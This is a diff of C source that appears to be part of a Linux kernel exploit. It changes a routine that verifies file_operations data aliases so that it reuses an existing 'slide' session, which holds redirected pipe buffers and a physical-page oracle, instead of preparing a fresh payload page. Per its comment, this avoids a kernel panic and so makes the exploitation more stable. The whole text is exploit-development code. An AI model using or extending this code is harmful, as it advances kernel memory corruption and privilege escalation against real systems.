@@ -246,11 +246,26 @@ static int verify_fops_data_alias_before_production(void) {
     const int max_search_batches = APP_FOPS_FRESH_PAGE_ATTEMPTS;
 #endif
     int prepare_oracle = 1;
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE && \
+    defined(APP_FOPS_REUSE_VERIFIED_PAGE) && APP_FOPS_REUSE_VERIFIED_PAGE
+    /*
+     * The slide pass already established a verified fresh P0 session
+     * (gate+probe+restore confirmed, reference keeper holding the
+     * redirected pipe buffers).  Tearing it down and preparing a second
+     * fresh session drops put_page on kernel slab pages behind the
+     * keeper-owned pipes and panics the kernel; reuse the live session
+     * for the alias verification instead.
+     */
+    int reuse_slide_p0_session =
+        page_base != 0 && pipebuf_page_base != 0;
+#else
+    int reuse_slide_p0_session = 0;
+#endif
     while (fresh_attempt <= APP_FOPS_FRESH_PAGE_ATTEMPTS &&
            search_batch < max_search_batches) {
       fops_data_probe_addr = aliases[index];
       fops_data_probe_active = 1;
-      if (prepare_oracle) {
+      if (prepare_oracle && !reuse_slide_p0_session) {
         reset_pipe_attempt();
         if (!prepare_p0_pipe_oracle()) {
           pr_error("fops data alias pipe preparation failed candidate=%s\n",
@@ -260,7 +275,12 @@ static int verify_fops_data_alias_before_production(void) {
         }
         prepare_oracle = 0;
       }
-      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+      if (reuse_slide_p0_session) {
+        pr_info("fops data alias reuse slide session base=%016zx "
+                "pipe_page=%016zx\n", page_base, pipebuf_page_base);
+      } else {
+        page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+      }
       search_batch++;
       pr_info("fops data alias search candidate=%s batch=%d/%d "
               "gate_attempt=%d/%d base=%016zx\n",
